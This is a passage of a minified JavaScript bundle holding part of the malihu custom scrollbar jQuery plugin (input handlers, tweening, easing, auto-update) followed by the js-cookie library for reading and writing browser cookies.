                            var h = [Math.abs(E[0].offsetTop) - y[0] * a(u[0] / _[0], _[0]), Math.abs(E[0].offsetLeft) - y[1] * a(u[1] / _[1], _[1])];
                            w = "yx" === T.axis ? [h[0], h[1]] : "x" === T.axis ? [null, h[1]] : [h[0], null], b = [4 * u[0] + T.scrollInertia, 4 * u[1] + T.scrollInertia];
                            var $ = parseInt(T.contentTouchScroll) || 0;
                            w[0] = u[0] > $ ? w[0] : 0, w[1] = u[1] > $ ? w[1] : 0, S.overflowed[0] && l(w[0], b[0], o, "y", M, !1), S.overflowed[1] && l(w[1], b[1], o, "x", M, !1)
                        }
                    }
                }

                function a(t, e) {
                    var i = [1.5 * e, 2 * e, e / 1.5, e / 2];
                    return t > 90 ? e > 4 ? i[0] : i[3] : t > 60 ? e > 3 ? i[3] : i[2] : t > 30 ? e > 8 ? i[1] : e > 6 ? i[0] : e > 4 ? e : i[2] : e > 8 ? e : i[3]
                }

                function l(t, e, i, n, o, s) {
                    t && X($, t.toString(), {dur: e, scrollEasing: i, dir: n, overwrite: o, drag: s})
                }

                var d, u, h, p, f, g, m, v, y, _, w, b, x, C, $ = t(this), S = $.data(n), T = S.opt, k = n + "_" + S.idx,
                    O = t("#mCSB_" + S.idx), E = t("#mCSB_" + S.idx + "_container"),
                    z = [t("#mCSB_" + S.idx + "_dragger_vertical"), t("#mCSB_" + S.idx + "_dragger_horizontal")], I = [],
                    D = [], L = 0, M = "yx" === T.axis ? "none" : "all", q = [], B = E.find("iframe"),
                    j = ["touchstart." + k + " pointerdown." + k + " MSPointerDown." + k, "touchmove." + k + " pointermove." + k + " MSPointerMove." + k, "touchend." + k + " pointerup." + k + " MSPointerUp." + k],
                    R = void 0 !== document.body.style.touchAction;
                E.bind(j[0], (function (t) {
                    i(t)
                })).bind(j[1], (function (t) {
                    o(t)
                })), O.bind(j[0], (function (t) {
                    s(t)
                })).bind(j[2], (function (t) {
                    r(t)
                })), B.length && B.each((function () {
                    t(this).load((function () {
                        P(this) && t(this.contentDocument || this.contentWindow.document).bind(j[0], (function (t) {
                            i(t), s(t)
                        })).bind(j[1], (function (t) {
                            o(t)
                        })).bind(j[2], (function (t) {
                            r(t)
                        }))
                    }))
                }))
            }, I = function () {
                function i() {
                    return window.getSelection ? window.getSelection().toString() : document.selection && "Control" != document.selection.type ? document.selection.createRange().text : 0
                }

                function o(t, e, i) {
                    d.type = i && s ? "stepped" : "stepless", d.scrollAmount = 10, H(r, t, e, "mcsLinearOut", i ? 60 : null)
                }

                var s, r = t(this), a = r.data(n), l = a.opt, d = a.sequential, u = n + "_" + a.idx,
                    h = t("#mCSB_" + a.idx + "_container"), p = h.parent();
                h.bind("mousedown." + u, (function (t) {
                    e || s || (s = 1, c = !0)
                })).add(document).bind("mousemove." + u, (function (t) {
                    if (!e && s && i()) {
                        var n = h.offset(), r = A(t)[0] - n.top + h[0].offsetTop, c = A(t)[1] - n.left + h[0].offsetLeft;
                        r > 0 && r < p.height() && c > 0 && c < p.width() ? d.step && o("off", null, "stepped") : ("x" !== l.axis && a.overflowed[0] && (0 > r ? o("on", 38) : r > p.height() && o("on", 40)), "y" !== l.axis && a.overflowed[1] && (0 > c ? o("on", 37) : c > p.width() && o("on", 39)))
                    }
                })).bind("mouseup." + u + " dragend." + u, (function (t) {
                    e || (s && (s = 0, o("off", null)), c = !1)
                }))
            }, D = function () {
                function e(e, n) {
                    if (Y(i), !L(i, e.target)) {
                        var r = "auto" !== s.mouseWheel.deltaFactor ? parseInt(s.mouseWheel.deltaFactor) : l && e.deltaFactor < 100 ? 100 : e.deltaFactor || 100,
                            d = s.scrollInertia;
                        if ("x" === s.axis || "x" === s.mouseWheel.axis) var u = "x",
                            h = [Math.round(r * o.scrollRatio.x), parseInt(s.mouseWheel.scrollAmount)],
                            p = "auto" !== s.mouseWheel.scrollAmount ? h[1] : h[0] >= a.width() ? .9 * a.width() : h[0],
                            f = Math.abs(t("#mCSB_" + o.idx + "_container")[0].offsetLeft), g = c[1][0].offsetLeft,
                            m = c[1].parent().width() - c[1].width(),
                            v = e.deltaX || e.deltaY || n; else u = "y", h = [Math.round(r * o.scrollRatio.y), parseInt(s.mouseWheel.scrollAmount)], p = "auto" !== s.mouseWheel.scrollAmount ? h[1] : h[0] >= a.height() ? .9 * a.height() : h[0], f = Math.abs(t("#mCSB_" + o.idx + "_container")[0].offsetTop), g = c[0][0].offsetTop, m = c[0].parent().height() - c[0].height(), v = e.deltaY || n;
                        "y" === u && !o.overflowed[0] || "x" === u && !o.overflowed[1] || ((s.mouseWheel.invert || e.webkitDirectionInvertedFromDevice) && (v = -v), s.mouseWheel.normalizeDelta && (v = 0 > v ? -1 : 1), (v > 0 && 0 !== g || 0 > v && g !== m || s.mouseWheel.preventDefault) && (e.stopImmediatePropagation(), e.preventDefault()), e.deltaFactor < 2 && !s.mouseWheel.normalizeDelta && (p = e.deltaFactor, d = 17), X(i, (f - v * p).toString(), {
                            dir: u,
                            dur: d
                        }))
                    }
                }

                if (t(this).data(n)) {
                    var i = t(this), o = i.data(n), s = o.opt, r = n + "_" + o.idx, a = t("#mCSB_" + o.idx),
                        c = [t("#mCSB_" + o.idx + "_dragger_vertical"), t("#mCSB_" + o.idx + "_dragger_horizontal")],
                        d = t("#mCSB_" + o.idx + "_container").find("iframe");
                    d.length && d.each((function () {
                        t(this).load((function () {
                            P(this) && t(this.contentDocument || this.contentWindow.document).bind("mousewheel." + r, (function (t, i) {
                                e(t, i)
                            }))
                        }))
                    })), a.bind("mousewheel." + r, (function (t, i) {
                        e(t, i)
                    }))
                }
            }, P = function (t) {
                var e = null;
                if (t) {
                    try {
                        e = (t.contentDocument || t.contentWindow.document).body.innerHTML
                    } catch (t) {
                    }
                    return null !== e
                }
                try {
                    e = top.document.body.innerHTML
                } catch (t) {
                }
                return null !== e
            }, L = function (e, i) {
                var o = i.nodeName.toLowerCase(), s = e.data(n).opt.mouseWheel.disableOver, r = ["select", "textarea"];
                return t.inArray(o, s) > -1 && !(t.inArray(o, r) > -1 && !t(i).is(":focus"))
            }, M = function () {
                var e, i = t(this), o = i.data(n), s = n + "_" + o.idx, r = t("#mCSB_" + o.idx + "_container"),
                    a = r.parent();
                t(".mCSB_" + o.idx + "_scrollbar ." + d[12]).bind("mousedown." + s + " touchstart." + s + " pointerdown." + s + " MSPointerDown." + s, (function (i) {
                    c = !0, t(i.target).hasClass("mCSB_dragger") || (e = 1)
                })).bind("touchend." + s + " pointerup." + s + " MSPointerUp." + s, (function (t) {
                    c = !1
                })).bind("click." + s, (function (n) {
                    if (e && (e = 0, t(n.target).hasClass(d[12]) || t(n.target).hasClass("mCSB_draggerRail"))) {
                        Y(i);
                        var s = t(this), l = s.find(".mCSB_dragger");
                        if (s.parent(".mCSB_scrollTools_horizontal").length > 0) {
                            if (!o.overflowed[1]) return;
                            var c = "x", u = n.pageX > l.offset().left ? -1 : 1,
                                h = Math.abs(r[0].offsetLeft) - .9 * u * a.width()
                        } else {
                            if (!o.overflowed[0]) return;
                            c = "y", u = n.pageY > l.offset().top ? -1 : 1, h = Math.abs(r[0].offsetTop) - .9 * u * a.height()
                        }
                        X(i, h.toString(), {dir: c, scrollEasing: "mcsEaseInOut"})
                    }
                }))
            }, q = function () {
                var e = t(this), i = e.data(n), o = i.opt, s = n + "_" + i.idx, r = t("#mCSB_" + i.idx + "_container"),
                    a = r.parent();
                r.bind("focusin." + s, (function (i) {
                    var n = t(document.activeElement), s = r.find(".mCustomScrollBox").length, l = 0;
                    n.is(o.advanced.autoScrollOnFocus) && (Y(e), clearTimeout(e[0]._focusTimeout), e[0]._focusTimer = s ? (l + 17) * s : 0, e[0]._focusTimeout = setTimeout((function () {
                        var t = [et(n)[0], et(n)[1]], i = [r[0].offsetTop, r[0].offsetLeft],
                            s = [i[0] + t[0] >= 0 && i[0] + t[0] < a.height() - n.outerHeight(!1), i[1] + t[1] >= 0 && i[0] + t[1] < a.width() - n.outerWidth(!1)],
                            c = "yx" !== o.axis || s[0] || s[1] ? "all" : "none";
                        "x" === o.axis || s[0] || X(e, t[0].toString(), {
                            dir: "y",
                            scrollEasing: "mcsEaseInOut",
                            overwrite: c,
                            dur: l
                        }), "y" === o.axis || s[1] || X(e, t[1].toString(), {
                            dir: "x",
                            scrollEasing: "mcsEaseInOut",
                            overwrite: c,
                            dur: l
                        })
                    }), e[0]._focusTimer))
                }))
            }, B = function () {
                var e = t(this).data(n), i = n + "_" + e.idx, o = t("#mCSB_" + e.idx + "_container").parent();
                o.bind("scroll." + i, (function (i) {
                    (0 !== o.scrollTop() || 0 !== o.scrollLeft()) && t(".mCSB_" + e.idx + "_scrollbar").css("visibility", "hidden")
                }))
            }, j = function () {
                var e = t(this), i = e.data(n), o = i.opt, s = i.sequential, r = n + "_" + i.idx,
                    a = ".mCSB_" + i.idx + "_scrollbar";
                t(a + ">a").bind("mousedown." + r + " touchstart." + r + " pointerdown." + r + " MSPointerDown." + r + " mouseup." + r + " touchend." + r + " pointerup." + r + " MSPointerUp." + r + " mouseout." + r + " pointerout." + r + " MSPointerOut." + r + " click." + r, (function (n) {
                    function r(t, i) {
                        s.scrollAmount = o.scrollButtons.scrollAmount, H(e, t, i)
                    }

                    if (n.preventDefault(), Z(n)) {
                        var a = t(this).attr("class");
                        switch (s.type = o.scrollButtons.scrollType, n.type) {
                            case"mousedown":
                            case"touchstart":
                            case"pointerdown":
                            case"MSPointerDown":
                                if ("stepped" === s.type) return;
                                c = !0, i.tweenRunning = !1, r("on", a);
                                break;
                            case"mouseup":
                            case"touchend":
                            case"pointerup":
                            case"MSPointerUp":
                            case"mouseout":
                            case"pointerout":
                            case"MSPointerOut":
                                if ("stepped" === s.type) return;
                                c = !1, s.dir && r("off", a);
                                break;
                            case"click":
                                if ("stepped" !== s.type || i.tweenRunning) return;
                                r("on", a)
                        }
                    }
                }))
            }, R = function () {
                function e(e) {
                    function n(t, e) {
                        r.type = s.keyboard.scrollType, r.scrollAmount = s.keyboard.scrollAmount, "stepped" === r.type && o.tweenRunning || H(i, t, e)
                    }

                    switch (e.type) {
                        case"blur":
                            o.tweenRunning && r.dir && n("off", null);
                            break;
                        case"keydown":
                        case"keyup":
                            var a = e.keyCode ? e.keyCode : e.which, l = "on";
                            if ("x" !== s.axis && (38 === a || 40 === a) || "y" !== s.axis && (37 === a || 39 === a)) {
                                if ((38 === a || 40 === a) && !o.overflowed[0] || (37 === a || 39 === a) && !o.overflowed[1]) return;
                                "keyup" === e.type && (l = "off"), t(document.activeElement).is(u) || (e.preventDefault(), e.stopImmediatePropagation(), n(l, a))
                            } else if (33 === a || 34 === a) {
                                if ((o.overflowed[0] || o.overflowed[1]) && (e.preventDefault(), e.stopImmediatePropagation()), "keyup" === e.type) {
                                    Y(i);
                                    var h = 34 === a ? -1 : 1;
                                    if ("x" === s.axis || "yx" === s.axis && o.overflowed[1] && !o.overflowed[0]) var p = "x",
                                        f = Math.abs(c[0].offsetLeft) - .9 * h * d.width(); else p = "y", f = Math.abs(c[0].offsetTop) - .9 * h * d.height();
                                    X(i, f.toString(), {dir: p, scrollEasing: "mcsEaseInOut"})
                                }
                            } else 35 !== a && 36 !== a || t(document.activeElement).is(u) || ((o.overflowed[0] || o.overflowed[1]) && (e.preventDefault(), e.stopImmediatePropagation()), "keyup" !== e.type) || ("x" === s.axis || "yx" === s.axis && o.overflowed[1] && !o.overflowed[0] ? (p = "x", f = 35 === a ? Math.abs(d.width() - c.outerWidth(!1)) : 0) : (p = "y", f = 35 === a ? Math.abs(d.height() - c.outerHeight(!1)) : 0), X(i, f.toString(), {
                                dir: p,
                                scrollEasing: "mcsEaseInOut"
                            }))
                    }
                }

                var i = t(this), o = i.data(n), s = o.opt, r = o.sequential, a = n + "_" + o.idx, l = t("#mCSB_" + o.idx),
                    c = t("#mCSB_" + o.idx + "_container"), d = c.parent(),
                    u = "input,textarea,select,datalist,keygen,[contenteditable='true']", h = c.find("iframe"),
                    p = ["blur." + a + " keydown." + a + " keyup." + a];
                h.length && h.each((function () {
                    t(this).load((function () {
                        P(this) && t(this.contentDocument || this.contentWindow.document).bind(p[0], (function (t) {
                            e(t)
                        }))
                    }))
                })), l.attr("tabindex", "0").bind(p[0], (function (t) {
                    e(t)
                }))
            }, H = function (e, i, o, s, r) {
                function a(t) {
                    u.snapAmount && (h.scrollAmount = u.snapAmount instanceof Array ? "x" === h.dir[0] ? u.snapAmount[1] : u.snapAmount[0] : u.snapAmount);
                    var i = "stepped" !== h.type, n = r || (t ? i ? g / 1.5 : m : 1e3 / 60), o = t ? i ? 7.5 : 40 : 2.5,
                        l = [Math.abs(p[0].offsetTop), Math.abs(p[0].offsetLeft)],
                        d = [c.scrollRatio.y > 10 ? 10 : c.scrollRatio.y, c.scrollRatio.x > 10 ? 10 : c.scrollRatio.x],
                        f = "x" === h.dir[0] ? l[1] + h.dir[1] * d[1] * o : l[0] + h.dir[1] * d[0] * o,
                        v = "x" === h.dir[0] ? l[1] + h.dir[1] * parseInt(h.scrollAmount) : l[0] + h.dir[1] * parseInt(h.scrollAmount),
                        y = "auto" !== h.scrollAmount ? v : f,
                        _ = s || (t ? i ? "mcsLinearOut" : "mcsEaseInOut" : "mcsLinear"), w = !!t;
                    return t && 17 > n && (y = "x" === h.dir[0] ? l[1] : l[0]), X(e, y.toString(), {
                        dir: h.dir[0],
                        scrollEasing: _,
                        dur: n,
                        onComplete: w
                    }), t ? void (h.dir = !1) : (clearTimeout(h.step), void (h.step = setTimeout((function () {
                        a()
                    }), n)))
                }

                function l() {
                    clearTimeout(h.step), K(h, "step"), Y(e)
                }

                var c = e.data(n), u = c.opt, h = c.sequential, p = t("#mCSB_" + c.idx + "_container"),
                    f = "stepped" === h.type, g = u.scrollInertia < 26 ? 26 : u.scrollInertia,
                    m = u.scrollInertia < 1 ? 17 : u.scrollInertia;
                switch (i) {
                    case"on":
                        if (h.dir = [o === d[16] || o === d[15] || 39 === o || 37 === o ? "x" : "y", o === d[13] || o === d[15] || 38 === o || 37 === o ? -1 : 1], Y(e), tt(o) && "stepped" === h.type) return;
                        a(f);
                        break;
                    case"off":
                        l(), (f || c.tweenRunning && h.dir) && a(!0)
                }
            }, W = function (e) {
                var i = t(this).data(n).opt, o = [];
                return "function" == typeof e && (e = e()), e instanceof Array ? o = e.length > 1 ? [e[0], e[1]] : "x" === i.axis ? [null, e[0]] : [e[0], null] : (o[0] = e.y ? e.y : e.x || "x" === i.axis ? null : e, o[1] = e.x ? e.x : e.y || "y" === i.axis ? null : e), "function" == typeof o[0] && (o[0] = o[0]()), "function" == typeof o[1] && (o[1] = o[1]()), o
            }, F = function (e, i) {
                if (null != e && void 0 !== e) {
                    var o = t(this), s = o.data(n), r = s.opt, a = t("#mCSB_" + s.idx + "_container"), l = a.parent(),
                        c = typeof e;
                    i || (i = "x" === r.axis ? "x" : "y");
                    var d = "x" === i ? a.outerWidth(!1) : a.outerHeight(!1),
                        h = "x" === i ? a[0].offsetLeft : a[0].offsetTop, p = "x" === i ? "left" : "top";
                    switch (c) {
                        case"function":
                            return e();
                        case"object":
                            if (!(g = e.jquery ? e : t(e)).length) return;
                            return "x" === i ? et(g)[1] : et(g)[0];
                        case"string":
                        case"number":
                            if (tt(e)) return Math.abs(e);
                            if (-1 !== e.indexOf("%")) return Math.abs(d * parseInt(e) / 100);
                            if (-1 !== e.indexOf("-=")) return Math.abs(h - parseInt(e.split("-=")[1]));
                            if (-1 !== e.indexOf("+=")) {
                                var f = h + parseInt(e.split("+=")[1]);
                                return f >= 0 ? 0 : Math.abs(f)
                            }
                            if (-1 !== e.indexOf("px") && tt(e.split("px")[0])) return Math.abs(e.split("px")[0]);
                            if ("top" === e || "left" === e) return 0;
                            if ("bottom" === e) return Math.abs(l.height() - a.outerHeight(!1));
                            if ("right" === e) return Math.abs(l.width() - a.outerWidth(!1));
                            if ("first" === e || "last" === e) {
                                var g = a.find(":" + e);
                                return "x" === i ? et(g)[1] : et(g)[0]
                            }
                            return t(e).length ? "x" === i ? et(t(e))[1] : et(t(e))[0] : (a.css(p, e), void u.update.call(null, o[0]))
                    }
                }
            }, N = function (e) {
                function i() {
                    return clearTimeout(h[0].autoUpdate), 0 === a.parents("html").length ? void (a = null) : void (h[0].autoUpdate = setTimeout((function () {
                        return c.advanced.updateOnSelectorChange && (l.poll.change.n = s(), l.poll.change.n !== l.poll.change.o) ? (l.poll.change.o = l.poll.change.n, void r(3)) : c.advanced.updateOnContentResize && (l.poll.size.n = a[0].scrollHeight + a[0].scrollWidth + h[0].offsetHeight + a[0].offsetHeight + a[0].offsetWidth, l.poll.size.n !== l.poll.size.o) ? (l.poll.size.o = l.poll.size.n, void r(1)) : !c.advanced.updateOnImageLoad || "auto" === c.advanced.updateOnImageLoad && "y" === c.axis || (l.poll.img.n = h.find("img").length, l.poll.img.n === l.poll.img.o) ? void ((c.advanced.updateOnSelectorChange || c.advanced.updateOnContentResize || c.advanced.updateOnImageLoad) && i()) : (l.poll.img.o = l.poll.img.n, void h.find("img").each((function () {
                            o(this)
                        })))
                    }), c.advanced.autoUpdateTimeout))
                }

                function o(e) {
                    function i(t, e) {
                        return function () {
                            return e.apply(t, arguments)
                        }
                    }

                    function n() {
                        this.onload = null, t(e).addClass(d[2]), r(2)
                    }

                    if (t(e).hasClass(d[2])) r(); else {
                        var o = new Image;
                        o.onload = i(o, n), o.src = e.src
                    }
                }

                function s() {
                    !0 === c.advanced.updateOnSelectorChange && (c.advanced.updateOnSelectorChange = "*");
                    var t = 0, e = h.find(c.advanced.updateOnSelectorChange);
                    return c.advanced.updateOnSelectorChange && e.length > 0 && e.each((function () {
                        t += this.offsetHeight + this.offsetWidth
                    })), t
                }

                function r(t) {
                    clearTimeout(h[0].autoUpdate), u.update.call(null, a[0], t)
                }

                var a = t(this), l = a.data(n), c = l.opt, h = t("#mCSB_" + l.idx + "_container");
                return e ? (clearTimeout(h[0].autoUpdate), void K(h[0], "autoUpdate")) : void i()
            }, U = function (t, e, i) {
                return Math.round(t / e) * e - i
            }, Y = function (e) {
                var i = e.data(n);
                t("#mCSB_" + i.idx + "_container,#mCSB_" + i.idx + "_container_wrapper,#mCSB_" + i.idx + "_dragger_vertical,#mCSB_" + i.idx + "_dragger_horizontal").each((function () {
                    V.call(this)
                }))
            }, X = function (e, i, o) {
                function s(t) {
                    return l && c.callbacks[t] && "function" == typeof c.callbacks[t]
                }

                function r() {
                    return [c.callbacks.alwaysTriggerOffsets || w >= b[0] + $, c.callbacks.alwaysTriggerOffsets || -S >= w]
                }

                function a() {
                    var t = [p[0].offsetTop, p[0].offsetLeft], i = [y[0].offsetTop, y[0].offsetLeft],
                        n = [p.outerHeight(!1), p.outerWidth(!1)], s = [h.height(), h.width()];
                    e[0].mcs = {
                        content: p,
                        top: t[0],
                        left: t[1],
                        draggerTop: i[0],
                        draggerLeft: i[1],
                        topPct: Math.round(100 * Math.abs(t[0]) / (Math.abs(n[0]) - s[0])),
                        leftPct: Math.round(100 * Math.abs(t[1]) / (Math.abs(n[1]) - s[1])),
                        direction: o.dir
                    }
                }

                var l = e.data(n), c = l.opt, d = {
                        trigger: "internal",
                        dir: "y",
                        scrollEasing: "mcsEaseOut",
                        drag: !1,
                        dur: c.scrollInertia,
                        overwrite: "all",
                        callbacks: !0,
                        onStart: !0,
                        onUpdate: !0,
                        onComplete: !0
                    }, u = [(o = t.extend(d, o)).dur, o.drag ? 0 : o.dur], h = t("#mCSB_" + l.idx),
                    p = t("#mCSB_" + l.idx + "_container"), f = p.parent(),
                    g = c.callbacks.onTotalScrollOffset ? W.call(e, c.callbacks.onTotalScrollOffset) : [0, 0],
                    m = c.callbacks.onTotalScrollBackOffset ? W.call(e, c.callbacks.onTotalScrollBackOffset) : [0, 0];
                if (l.trigger = o.trigger, (0 !== f.scrollTop() || 0 !== f.scrollLeft()) && (t(".mCSB_" + l.idx + "_scrollbar").css("visibility", "visible"), f.scrollTop(0).scrollLeft(0)), "_resetY" !== i || l.contentReset.y || (s("onOverflowYNone") && c.callbacks.onOverflowYNone.call(e[0]), l.contentReset.y = 1), "_resetX" !== i || l.contentReset.x || (s("onOverflowXNone") && c.callbacks.onOverflowXNone.call(e[0]), l.contentReset.x = 1), "_resetY" !== i && "_resetX" !== i) {
                    if (!l.contentReset.y && e[0].mcs || !l.overflowed[0] || (s("onOverflowY") && c.callbacks.onOverflowY.call(e[0]), l.contentReset.x = null), !l.contentReset.x && e[0].mcs || !l.overflowed[1] || (s("onOverflowX") && c.callbacks.onOverflowX.call(e[0]), l.contentReset.x = null), c.snapAmount) {
                        var v = c.snapAmount instanceof Array ? "x" === o.dir ? c.snapAmount[1] : c.snapAmount[0] : c.snapAmount;
                        i = U(i, v, c.snapOffset)
                    }
                    switch (o.dir) {
                        case"x":
                            var y = t("#mCSB_" + l.idx + "_dragger_horizontal"), _ = "left", w = p[0].offsetLeft,
                                b = [h.width() - p.outerWidth(!1), y.parent().width() - y.width()],
                                x = [i, 0 === i ? 0 : i / l.scrollRatio.x], $ = g[1], S = m[1],
                                T = $ > 0 ? $ / l.scrollRatio.x : 0, k = S > 0 ? S / l.scrollRatio.x : 0;
                            break;
                        case"y":
                            y = t("#mCSB_" + l.idx + "_dragger_vertical"), _ = "top", w = p[0].offsetTop, b = [h.height() - p.outerHeight(!1), y.parent().height() - y.height()], x = [i, 0 === i ? 0 : i / l.scrollRatio.y], $ = g[0], S = m[0], T = $ > 0 ? $ / l.scrollRatio.y : 0, k = S > 0 ? S / l.scrollRatio.y : 0
                    }
                    x[1] < 0 || 0 === x[0] && 0 === x[1] ? x = [0, 0] : x[1] >= b[1] ? x = [b[0], b[1]] : x[0] = -x[0], e[0].mcs || (a(), s("onInit") && c.callbacks.onInit.call(e[0])), clearTimeout(p[0].onCompleteTimeout), Q(y[0], _, Math.round(x[1]), u[1], o.scrollEasing), (l.tweenRunning || !(0 === w && x[0] >= 0 || w === b[0] && x[0] <= b[0])) && Q(p[0], _, Math.round(x[0]), u[0], o.scrollEasing, o.overwrite, {
                        onStart: function () {
                            o.callbacks && o.onStart && !l.tweenRunning && (s("onScrollStart") && (a(), c.callbacks.onScrollStart.call(e[0])), l.tweenRunning = !0, C(y), l.cbOffsets = r())
                        }, onUpdate: function () {
                            o.callbacks && o.onUpdate && s("whileScrolling") && (a(), c.callbacks.whileScrolling.call(e[0]))
                        }, onComplete: function () {
                            if (o.callbacks && o.onComplete) {
                                "yx" === c.axis && clearTimeout(p[0].onCompleteTimeout);
                                var t = p[0].idleTimer || 0;
                                p[0].onCompleteTimeout = setTimeout((function () {
                                    s("onScroll") && (a(), c.callbacks.onScroll.call(e[0])), s("onTotalScroll") && x[1] >= b[1] - T && l.cbOffsets[0] && (a(), c.callbacks.onTotalScroll.call(e[0])), s("onTotalScrollBack") && x[1] <= k && l.cbOffsets[1] && (a(), c.callbacks.onTotalScrollBack.call(e[0])), l.tweenRunning = !1, p[0].idleTimer = 0, C(y, "hide")
                                }), t)
                            }
                        }
                    })
                }
            }, Q = function (t, e, i, n, o, s, r) {
                function a() {
                    b.stop || (y || f.call(), y = G() - v, l(), y >= b.time && (b.time = y > b.time ? y + h - (y - b.time) : y + h - 1, b.time < y + 1 && (b.time = y + 1)), b.time < n ? b.id = p(a) : m.call())
                }

                function l() {
                    n > 0 ? (b.currVal = u(b.time, _, x, n, o), w[e] = Math.round(b.currVal) + "px") : w[e] = i + "px", g.call()
                }

                function c() {
                    h = 1e3 / 60, b.time = y + h, p = window.requestAnimationFrame ? window.requestAnimationFrame : function (t) {
                        return l(), setTimeout(t, .01)
                    }, b.id = p(a)
                }

                function d() {
                    null != b.id && (window.requestAnimationFrame ? window.cancelAnimationFrame(b.id) : clearTimeout(b.id), b.id = null)
                }

                function u(t, e, i, n, o) {
                    switch (o) {
                        case"linear":
                        case"mcsLinear":
                            return i * t / n + e;
                        case"mcsLinearOut":
                            return t /= n, t--, i * Math.sqrt(1 - t * t) + e;
                        case"easeInOutSmooth":
                            return 1 > (t /= n / 2) ? i / 2 * t * t + e : -i / 2 * (--t * (t - 2) - 1) + e;
                        case"easeInOutStrong":
                            return 1 > (t /= n / 2) ? i / 2 * Math.pow(2, 10 * (t - 1)) + e : (t--, i / 2 * (2 - Math.pow(2, -10 * t)) + e);
                        case"easeInOut":
                        case"mcsEaseInOut":
                            return 1 > (t /= n / 2) ? i / 2 * t * t * t + e : i / 2 * ((t -= 2) * t * t + 2) + e;
                        case"easeOutSmooth":
                            return t /= n, -i * (--t * t * t * t - 1) + e;
                        case"easeOutStrong":
                            return i * (1 - Math.pow(2, -10 * t / n)) + e;
                        case"easeOut":
                        case"mcsEaseOut":
                        default:
                            var s = (t /= n) * t, r = s * t;
                            return e + i * (.499999999999997 * r * s + -2.5 * s * s + 5.5 * r + -6.5 * s + 4 * t)
                    }
                }

                t._mTween || (t._mTween = {top: {}, left: {}});
                var h, p, f = (r = r || {}).onStart || function () {
                }, g = r.onUpdate || function () {
                }, m = r.onComplete || function () {
                }, v = G(), y = 0, _ = t.offsetTop, w = t.style, b = t._mTween[e];
                "left" === e && (_ = t.offsetLeft);
                var x = i - _;
                b.stop = 0, "none" !== s && d(), c()
            }, G = function () {
                return window.performance && window.performance.now ? window.performance.now() : window.performance && window.performance.webkitNow ? window.performance.webkitNow() : Date.now ? Date.now() : (new Date).getTime()
            }, V = function () {
                var t = this;
                t._mTween || (t._mTween = {top: {}, left: {}});
                for (var e = ["top", "left"], i = 0; i < e.length; i++) {
                    var n = e[i];
                    t._mTween[n].id && (window.requestAnimationFrame ? window.cancelAnimationFrame(t._mTween[n].id) : clearTimeout(t._mTween[n].id), t._mTween[n].id = null, t._mTween[n].stop = 1)
                }
            }, K = function (t, e) {
                try {
                    delete t[e]
                } catch (i) {
                    t[e] = null
                }
            }, Z = function (t) {
                return !(t.which && 1 !== t.which)
            }, J = function (t) {
                var e = t.originalEvent.pointerType;
                return !(e && "touch" !== e && 2 !== e)
            }, tt = function (t) {
                return !isNaN(parseFloat(t)) && isFinite(t)
            }, et = function (t) {
                var e = t.parents(".mCSB_container");
                return [t.offset().top - e.offset().top, t.offset().left - e.offset().left]
            }, it = function () {
                function t() {
                    var t = ["webkit", "moz", "ms", "o"];
                    if ("hidden" in document) return "hidden";
                    for (var e = 0; e < t.length; e++) if (t[e] + "Hidden" in document) return t[e] + "Hidden";
                    return null
                }

                var e = t();
                return !!e && document[e]
            };
        t.fn[i] = function (e) {
            return u[e] ? u[e].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof e && e ? void t.error("Method " + e + " does not exist") : u.init.apply(this, arguments)
        }, t[i] = function (e) {
            return u[e] ? u[e].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof e && e ? void t.error("Method " + e + " does not exist") : u.init.apply(this, arguments)
        }, t[i].defaults = s, window[i] = !0, t(window).load((function () {
            t(o)[i](), t.extend(t.expr[":"], {
                mcsInView: t.expr[":"].mcsInView || function (e) {
                    var i, n, o = t(e), s = o.parents(".mCSB_container");
                    if (s.length) return i = s.parent(), (n = [s[0].offsetTop, s[0].offsetLeft])[0] + et(o)[0] >= 0 && n[0] + et(o)[0] < i.height() - o.outerHeight(!1) && n[1] + et(o)[1] >= 0 && n[1] + et(o)[1] < i.width() - o.outerWidth(!1)
                }, mcsOverflow: t.expr[":"].mcsOverflow || function (e) {
                    var i = t(e).data(n);
                    if (i) return i.overflowed[0] || i.overflowed[1]
                }
            })
        }))
    }()
})), function (t) {
    var e = !1;
    if ("function" == typeof define && define.amd && (define(t), e = !0), "object" == typeof exports && (module.exports = t(), e = !0), !e) {
        var i = window.Cookies, n = window.Cookies = t();
        n.noConflict = function () {
            return window.Cookies = i, n
        }
    }
}((function () {
    function t() {
        for (var t = 0, e = {}; t < arguments.length; t++) {
            var i = arguments[t];
            for (var n in i) e[n] = i[n]
        }
        return e
    }

    return function e(i) {
        function n(e, o, s) {
            var r;
            if ("undefined" != typeof document) {
                if (arguments.length > 1) {
                    if ("number" == typeof (s = t({path: "/"}, n.defaults, s)).expires) {
                        var a = new Date;
                        a.setMilliseconds(a.getMilliseconds() + 864e5 * s.expires), s.expires = a
                    }
                    s.expires = s.expires ? s.expires.toUTCString() : "";
                    try {
                        r = JSON.stringify(o), /^[\{\[]/.test(r) && (o = r)
                    } catch (t) {
                    }
                    o = i.write ? i.write(o, e) : encodeURIComponent(o + "").replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent), e = (e = (e = encodeURIComponent(e + "")).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent)).replace(/[\(\)]/g, escape);
                    var l = "";
                    for (var c in s) s[c] && (l += "; " + c, !0 !== s[c] && (l += "=" + s[c]));
                    return document.cookie = e + "=" + o + l
                }
                e || (r = {});
                for (var d = document.cookie ? document.cookie.split("; ") : [], u = /(%[0-9A-Z]{2})+/g, h = 0; h < d.length; h++) {
                    var p = d[h].split("="), f = p.slice(1).join("=");
                    this.json || '"' !== f.charAt(0) || (f = f.slice(1, -1));
                    try {
                        var g = p[0].replace(u, decodeURIComponent);
                        if (f = i.read ? i.read(f, g) : i(f, g) || f.replace(u, decodeURIComponent), this.json) try {
                            f = JSON.parse(f)
                        } catch (t) {
                        }
                        if (e === g) {
                            r = f;
                            break
                        }
                        e || (r[g] = f)
                    } catch (t) {
                    }
                }
                return r
            }
        }

        return n.set = n, n.get = function (t) {
            return n.call(n, t)
        }, n.getJSON = function () {
            return n.apply({json: !0}, [].slice.call(arguments))
        }, n.defaults = {}, n.remove = function (e, i) {
            n(e, "", t(i, {expires: -1}))
        }, n.withConverter = e, n
    }((function () {
    }))
})), function (t, e) {
